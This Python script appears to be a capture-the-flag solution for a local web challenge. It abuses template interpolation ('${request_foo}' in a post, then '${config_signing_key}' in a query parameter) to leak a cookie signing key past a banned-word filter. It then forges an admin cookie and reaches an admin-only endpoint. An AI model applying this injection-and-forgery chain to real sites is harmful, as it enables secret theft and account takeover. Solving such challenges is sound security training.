from requests import Session
from hashlib import sha256
from binascii import hexlify, unhexlify
import random
import string

HOST = "http://localhost:9090"
cookie_signing_key = None


def sign_cookie(value):
    global cookie_signing_key
    value = bytes(value, "ascii")
    sig_key = bytes(cookie_signing_key, "ascii")
    sig = sha256(value + sig_key).digest()
    return hexlify(sig + value).decode("ascii")


s = Session()

name = "".join(random.choice(string.ascii_lowercase) for _ in range(32))
email = name + "@email.com"
password = "".join(random.choice(string.ascii_lowercase) for _ in range(32))

# create a user
s.post(HOST + "/register", data={"name": name, "email": email, "password": password})
print("Cookies after registering: ", s.cookies)
# post a post that abuses interpolation to include a request parameter
# (we can't directly leak the signing key with this because it's a "banned word",
# so we have to abuse this level of indirection)
s.post(HOST + "/post", data={"post": "XXX${request_foo}XXX"})
# now, we can set the get parameter 'foo' to ${config_signing_key} in order to
# leak the cookie signing key
r = s.get(HOST + "/?foo=${config_signing_key}")
cookie_signing_key = r.text[r.text.find("XXX") + 3 : r.text.rfind("XXX")]
print("Cookie signing key: ", cookie_signing_key)
# now we can become admin by signing their email as our email cookie
s.cookies["email"] = sign_cookie("admin@wtf.sql")
# and let's hit the /list_users endpoint, which is admins only, to verify that
# we did everything right so far
r = s.get(HOST + "/list_users")
assert r.status_code == 200, "Failed to sign admin cookie properly!"
